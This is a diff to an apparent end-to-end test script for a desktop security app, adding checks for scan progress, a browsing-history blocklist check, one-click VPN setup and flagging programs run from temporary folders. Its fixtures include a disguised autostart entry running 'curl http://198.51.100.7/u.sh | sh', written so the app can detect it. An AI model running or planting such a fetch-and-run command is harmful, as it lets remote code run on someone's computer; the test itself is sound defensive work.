@@ -5,7 +5,8 @@
  */
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { mkdir, mkdtemp, readFile, readdir, stat, writeFile } from "node:fs/promises";
+import { spawn } from "node:child_process";
+import { chmod, copyFile, mkdir, mkdtemp, readFile, readdir, stat, writeFile } from "node:fs/promises";
 import { createServer } from "node:http";
 import { createServer as createTcpServer } from "node:net";
 import { createRequire } from "node:module";
@@ -26,7 +27,8 @@ const sampleHash = createHash("sha256").update(SAMPLE).digest("hex");
 
 // Stand-in for the account side: queues a full scan and a quarantine once the
 // person allows remote scans, and records what the app reports back.
-const device = { linked: false, heartbeats: [], queued: [], results: {}, started: [] };
+const device = { linked: false, heartbeats: [], queued: [], results: {}, started: [], progress: [], waits: 0, vpnKeys: [] };
+const SERVER_WG_KEY = Buffer.alloc(32, 7).toString("base64");
 const readBody = (request) =>
   new Promise((resolve) => {
     let data = "";
@@ -57,6 +59,30 @@ const server = createServer(async (request, response) => {
       return json(response, 200, { pending_commands: device.queued.length });
     }
     if (url === "/api/v1/devices/commands") return json(response, 200, device.queued.splice(0));
+    if (url.startsWith("/api/v1/devices/wait")) {
+      device.waits += 1;
+      await new Promise((resolve) => setTimeout(resolve, 300));
+      return json(response, 200, { pending: device.queued.length > 0 });
+    }
+    const progress = url.match(/^\/api\/v1\/devices\/commands\/([\w-]+)\/progress$/);
+    if (progress) {
+      device.progress.push({ id: progress[1], ...body });
+      return response.writeHead(204).end();
+    }
+    if (url === "/api/v1/devices/blocklist") {
+      return json(response, 200, { version: "t", generated_at: new Date().toISOString(), hosts: ["evil-history.example"], urls: ["https://shared.example.org/phish/login"], sources: ["test"] });
+    }
+    if (url === "/api/v1/devices/vpn") {
+      device.vpnKeys.push(body.public_key);
+      return json(response, 201, {
+        peer: { id: "peer-1", name: "PC (desktop app)", address: "10.13.13.5" },
+        address: "10.13.13.5/32",
+        dns: "10.13.13.1",
+        server_public_key: SERVER_WG_KEY,
+        endpoint: "vpn.example.org:51820",
+        allowed_ips: "0.0.0.0/0, ::/0",
+      });
+    }
     const started = url.match(/^\/api\/v1\/devices\/commands\/([\w-]+)\/started$/);
     if (started) {
       device.started.push(started[1]);
@@ -96,6 +122,26 @@ await mkdir(join(home, ".config", "autostart"), { recursive: true });
 await writeFile(join(home, ".config", "autostart", "updater.desktop"), "[Desktop Entry]\nType=Application\nName=System Updater\nExec=sh -c 'curl http://198.51.100.7/u.sh | sh'\n");
 // A program reachable from the network on the VNC port, which the security centre should flag.
 const vnc = createTcpServer().listen(5900, "0.0.0.0");
+// Browser history with one visit to a listed domain and one to a listed exact URL.
+const chromeProfile = join(home, ".config", "google-chrome", "Default");
+await mkdir(chromeProfile, { recursive: true });
+{
+  const { DatabaseSync } = await import("node:sqlite");
+  const db = new DatabaseSync(join(chromeProfile, "History"));
+  db.exec("CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, last_visit_time INTEGER)");
+  const now = BigInt(Date.now()) * 1000n + 11_644_473_600_000_000n;
+  db.prepare("INSERT INTO urls (url, last_visit_time) VALUES (?, ?), (?, ?), (?, ?)").run(
+    "https://login.evil-history.example/account", now,
+    "https://shared.example.org/phish/login", now,
+    "https://news.example/", now,
+  );
+  db.close();
+}
+// A program running from a temporary folder, which the running-programs check flags.
+const sleepy = join(work, "sleepy");
+await copyFile("/bin/sleep", sleepy);
+await chmod(sleepy, 0o755);
+const sleeper = spawn(sleepy, ["600"], { stdio: "ignore" });
 await writeFile(join(files, "eicar.com"), EICAR);
 await writeFile(join(files, "sample.bin"), SAMPLE);
 await writeFile(join(files, "notes.txt"), "Shopping list: milk, bread, eggs");
@@ -186,11 +232,46 @@ await assert.rejects(stat(join(files, "sample.bin")));
 await shot(page, "desktop-account");
 step("scan started from the account ran here, reported detections, then quarantined the file it found");
 
+assert.ok(device.progress.some((p) => p.id === "cmd-scan" && p.scanned >= 1), `progress reported: ${JSON.stringify(device.progress)}`);
+assert.ok(!JSON.stringify(device.progress).includes(work), "progress must not contain paths");
+for (let i = 0; i < 50 && device.waits === 0; i++) await new Promise((resolve) => setTimeout(resolve, 200));
+assert.ok(device.waits >= 1, "the app keeps a long request open for new commands");
+step("live scan progress reported as counts only; long poll for new commands");
+
+// Browsing-history check: list downloaded, history compared on this computer.
+await page.click('[data-tab="security"]');
+await page.click("#browsing-check");
+await page.waitForSelector("#browsing-summary");
+const browsing = await page.locator("#browsing").innerText();
+assert.match(browsing, /2 visit\(s\) to sites on the danger lists/);
+assert.match(browsing, /login\.evil-history\.example/);
+assert.match(browsing, /This exact page is listed/);
+assert.doesNotMatch(browsing, /news\.example/);
+await shot(page, "desktop-browsing");
+step("browsing-history check finds a listed domain and a listed exact page; others untouched");
+
+// One-click VPN: keys made here, only the public key sent, tunnel file kept private.
+await page.click('[data-tab="protection"]');
+await page.click("#vpn-setup");
+await page.waitForSelector("#vpn >> text=Show the tunnel file").catch(async () => page.waitForSelector("#vpn-toggle"));
+assert.equal(device.vpnKeys.length, 1);
+assert.match(device.vpnKeys[0], /^[A-Za-z0-9+/]{43}=$/);
+const tunnel = join(profile, "sentinel-vpn.conf");
+const tunnelText = await readFile(tunnel, "utf8");
+assert.match(tunnelText, /PrivateKey = [A-Za-z0-9+/]{43}=/);
+assert.ok(!tunnelText.includes(device.vpnKeys[0]), "the tunnel file holds the private key, the server only got the public one");
+assert.match(tunnelText, new RegExp(`PublicKey = ${SERVER_WG_KEY.replace(/[+/]/g, "\\$&")}`));
+assert.equal((await stat(tunnel)).mode & 0o777, 0o600);
+await shot(page, "desktop-vpn");
+step("VPN set up from the app: key pair generated locally, only the public key sent, tunnel file owner-only");
+await page.click('[data-tab="settings"]');
+
 page.once("dialog", (dialog) => dialog.accept());
 await page.click("#unlink-button");
 await page.waitForSelector("#link-code");
 assert.equal(device.linked, false);
-step("removing the computer from the account unlinks it on the server");
+await assert.rejects(stat(tunnel), "the VPN tunnel is forgotten when the computer is unlinked");
+step("removing the computer from the account unlinks it on the server and forgets the VPN tunnel");
 
 // Security centre.
 await page.click('[data-tab="security"]');
@@ -206,6 +287,16 @@ await page.click("#security-recheck");
 await page.waitForSelector("#startup >> text=New since your last review");
 await shot(page, "desktop-security");
 await page.click("text=Mark all as reviewed");
+// Running programs: the copy of sleep in a temporary folder is flagged.
+await page.click("#programs-check");
+await page.waitForSelector("#programs-summary", { timeout: 120000 });
+const programs = await page.locator("#programs").innerText();
+assert.match(programs, /sleepy/);
+assert.match(programs, /Runs from a temporary folder/);
+assert.match(programs, new RegExp(`Process .*${sleeper.pid}`));
+assert.match(await page.locator("#encryption").innerText(), /Disk encryption/);
+await shot(page, "desktop-programs");
+step("running programs checked; one started from a temporary folder is flagged; disk encryption reported");
 await page.waitForFunction(() => !document.querySelector("#startup")?.textContent?.includes("New since your last review"));
 step("security centre: risky open port, startup entry running a downloaded script, new startup item since last review");
 
@@ -268,6 +359,7 @@ await shot(page, "desktop-arabic");
 step("interface switches to Arabic, right to left");
 
 await app.close();
+sleeper.kill();
 server.close();
 vnc.close();
 console.log("All desktop checks passed.");
